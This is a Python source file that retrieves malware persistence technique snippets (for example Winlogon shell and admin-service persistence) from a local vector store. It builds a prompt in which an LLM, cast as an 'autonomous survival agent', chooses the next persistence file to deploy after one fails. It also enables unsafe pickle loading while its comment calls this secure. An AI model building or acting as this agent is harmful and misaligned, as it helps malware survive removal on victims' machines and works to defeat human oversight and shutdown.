import os
import json
from langchain_community.vectorstores import FAISS
from langchain_community.embeddings.fastembed import FastEmbedEmbeddings

def get_survival_strategy(failed_technique: str, blacklist: list) -> str:
    """
    Loads a local FAISS index, retrieves alternative survival strategies (excluding the blacklist),
    and constructs a structured JSON prompt for an LLM to select the next technique.
    
    :param failed_technique: A string describing the technique that just failed.
    :param blacklist: A list of previously tried or blacklisted technique filenames.
    :return: A JSON-formatted string prompt for the LLM.
    """
    
    # 1. Initialize the correct embedding model to match our vector store
    # We use FastEmbed to remain consistent with the exact PyTorch-free environment setup.
    embeddings = FastEmbedEmbeddings()
    
    # Dynamically resolve path to the vector_store relative to this script
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    vector_store_dir = os.path.join(base_dir, "vector_store")
    
    # 2. Load the local FAISS index
    try:
        # Note: allow_dangerous_deserialization=True is required in newer LangChain 
        # versions when loading local FAISS (pickle) stores securely.
        vector_store = FAISS.load_local(
            vector_store_dir, 
            embeddings, 
            allow_dangerous_deserialization=True
        )
    except Exception as e:
        return json.dumps({"error": f"Failed to load vector store: {e}"})

    # 3. Perform semantic search
    # Searching for alternative persistence methods similar to the failed one
    query = f"persistence technique alternative to {failed_technique}"
    
    # We fetch a larger amount of results (k=15) because some might be filtered out by the blacklist
    docs = vector_store.similarity_search(query, k=15)
    
    filtered_context = []
    seen_sources = set()
    
    # Filter the documents to exclude any sources appearing in the blacklist
    for doc in docs:
        source_path = doc.metadata.get("source", "")
        # Extract just the filename to make comparison robust
        source_filename = os.path.basename(source_path)
        
        # Check if this document's file is in the blacklist
        is_blacklisted = any(bad_file.lower() in source_filename.lower() for bad_file in blacklist)
        
        if not is_blacklisted and source_filename not in seen_sources:
            filtered_context.append(f"Filename: {source_filename}\nSource Code Snippet:\n{doc.page_content}")
            seen_sources.add(source_filename)
            
        # Limit to the top 3 unique non-blacklisted files to keep the prompt context window manageable
        if len(seen_sources) >= 3:
            break
            
    context_str = "\n\n".join(filtered_context)

    # 4. Construct the structured JSON Prompt
    prompt_payload = {
        "system_instruction": "You are an autonomous survival agent operating to ensure persistence. "
                              "You must STRICTLY return ONLY the filename of the next technique to deploy. "
                              "You must wrap the filename in [TARGET] and [/TARGET] tags. Example: [TARGET]new_persistence.cpp[/TARGET]",
        "failed_technique": failed_technique,
        "blacklisted_techniques": blacklist,
        "retrieved_context": context_str,
        "task": f"The persistence technique '{failed_technique}' has failed. Use the provided context to select the next optimal technique file to execute, ensuring it is NOT one of the blacklisted techniques. Provide nothing else but the targeted filename."
    }

    return json.dumps(prompt_payload, indent=4)

if __name__ == "__main__":
    # Example usage for quick debugging
    test_failed = "admin_service_persistence.cpp"
    test_blacklist = ["admin_service_persistence.cpp", "winlogon_shell.cpp"]
    
    prompt = get_survival_strategy(test_failed, test_blacklist)
    print(prompt)
